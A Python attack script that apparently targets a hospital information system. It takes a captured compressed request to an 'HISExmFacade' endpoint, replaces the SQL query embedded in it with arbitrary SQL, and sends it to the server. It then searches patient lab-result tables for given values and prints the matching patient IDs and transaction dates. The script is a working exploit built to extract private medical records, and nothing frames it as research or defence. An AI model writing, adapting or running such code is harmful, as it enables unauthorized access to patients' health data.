from his_client_final import HISClient
import requests
import zlib
import re

class MultiTrxHunter(HISClient):
    def execute_sql(self, sql):
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

hunter = MultiTrxHunter()
values = ['12.2', '313']

for val in values:
    print(f"\n--- Searching for Value: {val} ---")
    sql = f"SELECT * FROM OPDUSR.PAT_RESULTD WHERE PRD_RESULT_VALUE = '{val}' AND ROWNUM <= 1"
    res = hunter.execute_sql(sql)
    
    if res and "<NewDataSet>" in res:
        trx_match = re.findall(r'<PRD_TRX_NUM>(.*?)</PRD_TRX_NUM>', res)
        if trx_match:
            trx = trx_match[0]
            print(f"Found TRX: {trx}")
            
            # Get Header
            sql_head = f"SELECT * FROM OPDUSR.PAT_RESULTH WHERE PRH_TRX_NUM = '{trx}'"
            res_head = hunter.execute_sql(sql_head)
            if res_head and "<NewDataSet>" in res_head:
                ids = re.findall(r'<PRH_PAT_ID>(.*?)</PRH_PAT_ID>', res_head)
                dates = re.findall(r'<PRH_TRX_DT>(.*?)</PRH_TRX_DT>', res_head)
                print(f"Patient ID: {ids}")
                print(f"Date: {dates}")
            else:
                print("[-] No header found.")
        else:
             print("[-] No TRX found in row.")
    else:
        print("[-] Value not found.")
